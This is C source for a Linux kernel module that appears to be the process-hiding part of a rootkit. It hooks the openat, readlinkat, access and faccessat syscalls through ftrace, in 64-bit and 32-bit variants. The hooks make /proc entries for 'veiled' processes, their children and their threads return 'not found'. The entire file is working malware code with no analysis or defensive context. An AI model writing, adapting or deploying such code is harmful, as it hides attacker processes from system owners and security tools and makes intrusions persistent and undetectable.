#include "../include/ub_core.h"
#include "../include/open.h"
#include "../ftrace/hook_engine.h"
#include "../include/veiled_pids.h"

#define PATH_BUF_SIZE 256

static asmlinkage long (*ub_real_openat)(const struct pt_regs *);
static asmlinkage long (*ub_real_openat32)(const struct pt_regs *);
static asmlinkage long (*ub_real_readlinkat)(const struct pt_regs *);
static asmlinkage long (*ub_real_readlinkat32)(const struct pt_regs *);
static asmlinkage long (*ub_real_access)(const struct pt_regs *);
static asmlinkage long (*ub_real_access32)(const struct pt_regs *);
static asmlinkage long (*ub_real_faccessat)(const struct pt_regs *);
static asmlinkage long (*ub_real_faccessat32)(const struct pt_regs *);
static asmlinkage long (*ub_real_faccessat2)(const struct pt_regs *);
static asmlinkage long (*ub_real_openat32_compat)(const struct pt_regs *);

static notrace bool ub_is_veiled_proc_path(const char __user *pathname)
{
    char buf[PATH_BUF_SIZE];
    long copied;
    char pid_buf[16] = {0};
    int i = 0, pid;

    if (!pathname)
        return false;

    memset(buf, 0, PATH_BUF_SIZE);
    copied = strncpy_from_user(buf, pathname, PATH_BUF_SIZE - 1);
    if (copied < 0)
        return false;

    buf[PATH_BUF_SIZE - 1] = '\0';

    if (strncmp(buf, "/proc/", 6) != 0)
        return false;

    const char *after = buf + 6;
    while (i < (int)sizeof(pid_buf) - 1 &&
           after[i] &&
           after[i] != '/' &&
           after[i] >= '0' && after[i] <= '9') {
        pid_buf[i] = after[i];
        i++;
    }
    pid_buf[i] = '\0';

    if (i == 0)
        return false;

    if (kstrtoint(pid_buf, 10, &pid) < 0)
        return false;

    if (pid == (int)task_tgid_vnr(current))
        return false;

    return ub_is_veiled(pid) || ub_is_offspring(pid) || ub_pid_is_thread(pid);
}

static notrace asmlinkage long ub_hook_openat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_openat(regs);
}

static notrace asmlinkage long ub_hook_readlinkat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_readlinkat(regs);
}

static notrace asmlinkage long ub_hook_access(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->di;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_access(regs);
}

static notrace asmlinkage long ub_hook_faccessat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_faccessat(regs);
}

static notrace asmlinkage long ub_hook_faccessat2(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_faccessat2(regs);
}

static notrace asmlinkage long ub_hook_openat32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->cx;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_openat32(regs);
}

static notrace asmlinkage long ub_hook_openat32_compat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->cx;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_openat32_compat(regs);
}

static notrace asmlinkage long ub_hook_readlinkat32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->cx;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_readlinkat32(regs);
}

static notrace asmlinkage long ub_hook_access32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->bx;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_access32(regs);
}

static notrace asmlinkage long ub_hook_faccessat32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->cx;
    if (ub_is_veiled_proc_path(pathname))
        return -ENOENT;
    return ub_real_faccessat32(regs);
}


static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_openat",      ub_hook_openat,      &ub_real_openat),
    HOOK("__ia32_sys_openat",     ub_hook_openat32,    &ub_real_openat32),
    HOOK("__ia32_compat_sys_openat", ub_hook_openat32_compat, &ub_real_openat32_compat),
    HOOK("__x64_sys_readlinkat",  ub_hook_readlinkat,  &ub_real_readlinkat),
    HOOK("__ia32_sys_readlinkat", ub_hook_readlinkat32, &ub_real_readlinkat32),
    HOOK("__x64_sys_access",      ub_hook_access,      &ub_real_access),
    HOOK("__ia32_sys_access",     ub_hook_access32,    &ub_real_access32),
    HOOK("__x64_sys_faccessat",   ub_hook_faccessat,   &ub_real_faccessat),
    HOOK("__ia32_sys_faccessat",  ub_hook_faccessat32, &ub_real_faccessat32),
    HOOK("__x64_sys_faccessat2",  ub_hook_faccessat2,  &ub_real_faccessat2),
};

notrace int ub_visor_start(void)
{
    return ub_fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void ub_visor_stop(void)
{
    ub_fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
